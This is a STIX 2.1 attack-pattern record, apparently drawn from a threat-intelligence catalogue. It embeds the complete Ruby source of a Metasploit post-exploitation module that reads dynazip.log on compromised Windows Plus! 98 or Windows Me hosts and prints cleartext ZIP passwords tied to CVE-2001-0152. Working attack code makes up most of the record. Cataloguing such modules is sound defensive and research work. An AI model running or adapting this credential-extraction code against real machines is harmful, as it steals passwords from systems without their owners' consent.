{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6555717-05b1-4ed9-a7da-83d3242cf4ab",
    "created": "2024-08-14T16:33:08.254626Z",
    "modified": "2024-08-14T16:33:08.25463Z",
    "name": "Windows Gather DynaZIP Saved Password Extraction",
    "description": " This module extracts clear text credentials from dynazip.log. The log file contains passwords used to encrypt compressed zip files in Microsoft Plus! 98 and Windows Me.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/dynazip_log.rb",
            "external_id": "dynazip_log.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0152"
        },
        {
            "source_name": "reference",
            "url": "https://support.microsoft.com/en-us/kb/265131"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather DynaZIP Saved Password Extraction',\n        'Description' => %q{\n          This module extracts clear text credentials from dynazip.log.\n          The log file contains passwords used to encrypt compressed zip\n          files in Microsoft Plus! 98 and Windows Me.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['bcoles'],\n        'References' => [\n          ['CVE', '2001-0152'],\n          ['MSB', 'MS01-019'],\n          ['PACKETSTORM', '24543'],\n          ['URL', 'https://support.microsoft.com/en-us/kb/265131']\n        ],\n        'DisclosureDate' => '2001-03-27',\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter', 'shell']\n      )\n    )\n  end\n\n  def run\n    creds = []\n\n    log_path = \"#{get_env('%WINDIR%')}\\\\dynazip.log\"\n\n    unless file?(log_path)\n      print_error(\"#{log_path} not found\")\n      return\n    end\n\n    print_good(\"Found DynaZip log file: #{log_path}\")\n\n    begin\n      log_data = read_file(log_path)\n    rescue EOFError\n      print_error('Log file is empty')\n      return\n    end\n\n    vprint_status(\"Processing log file (#{log_data.length} bytes)\")\n\n    log_data.split('- DynaZIP ZIP Diagnostic Log -').each do |log|\n      if log =~ /^lpszZIPFile: 0x[0-9a-f]+\\s*?^(.+)\\r\\n/\n        zip_path = ::Regexp.last_match(1)\n      else\n        next\n      end\n\n      vprint_status(\"Processing log entry for #{zip_path}\")\n\n      # The lpszEncryptCode appears to always be 0x712185d4 however\n      # we use a hex regex pattern, just in case.\n      # The line following the lpszEncryptCode contains the password.\n      passwd = log.scan(/^lpszEncryptCode: 0x[0-9a-f]+\\s*?^(.+)?\\r\\n/).flatten.first\n\n      # In the event that the user selected a blank encryption password\n      # the ZIP file is not encrypted, however an empty line is written\n      # to the log file.\n      if passwd.to_s.eql?('')\n        vprint_status('Did not find a password')\n        next\n      end\n\n      print_good(\"File: '#{zip_path}' -- Password: '#{passwd}'\")\n      creds << [zip_path, passwd]\n    end\n\n    if creds.empty?\n      print_error('No passwords were found in the log file')\n      return\n    end\n\n    table = Rex::Text::Table.new(\n      'Header' => 'ZIP Passwords',\n      'Indent' => 0,\n      'SortIndex' => 0,\n      'Columns' => ['File Path', 'Password']\n    )\n    creds.each { |c| table << c }\n    print_line\n    print_line(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-03-27",
    "x_mitre_platforms": [
        "['win']"
    ]
}